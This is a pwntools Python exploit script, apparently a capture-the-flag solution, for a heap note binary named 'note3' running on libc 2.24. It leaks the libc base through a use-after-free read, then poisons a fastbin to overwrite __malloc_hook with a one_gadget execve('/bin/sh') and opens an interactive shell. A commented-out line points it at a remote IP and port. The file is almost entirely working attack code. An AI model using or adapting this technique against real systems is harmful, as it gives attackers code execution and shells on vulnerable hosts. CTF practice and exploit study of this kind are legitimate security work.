#coding:utf-8
from pwn import *
context.log_level = 'debug'
elf = ELF("./note3")
libc = ELF("./libc-2.24.so")
p = elf.process()
#p=remote("45.76.173.177", 6666)
if args.G:
	gdb.attach(p)	
def add(size, content):
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil("Size:")
	p.sendline(str(size))
	p.recvuntil("Content:")
	p.sendline(content)
def show(idx):
	p.recvuntil(">>")
	p.sendline("2")
	p.recvuntil("Index:")
	p.sendline(str(idx))
def edit(idx, content):
	p.recvuntil(">>")
	p.sendline("3")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.send(content)
def free(idx):
	p.recvuntil(">>")
	p.sendline("4")
	p.recvuntil("Index:")
	p.sendline(str(idx))

def exp():
	add(0x100, 'a')#0
	add(0x100, 'a')#1
	free(0)
	show(0)
	#397b00
	libc_base = u64(p.recv(6)+'\x00'*2) - 0x397b00 - 88
	log.success("libc_base -->" + hex(libc_base))
	add(0x68, 'a')#2(0) 
	free(2)
	edit(2, p64(libc.sym['__malloc_hook'] +libc_base-0x23))
	add(0x68, 'a')
	'''
0x3f306 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x3f35a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xd694f execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
'''
	one = libc_base + 0xd694f
	add(0x68, 'a'*3 +p64(0)*2 +  p64(one))
	
        p.interactive()
if __name__ == '__main__':
	exp()
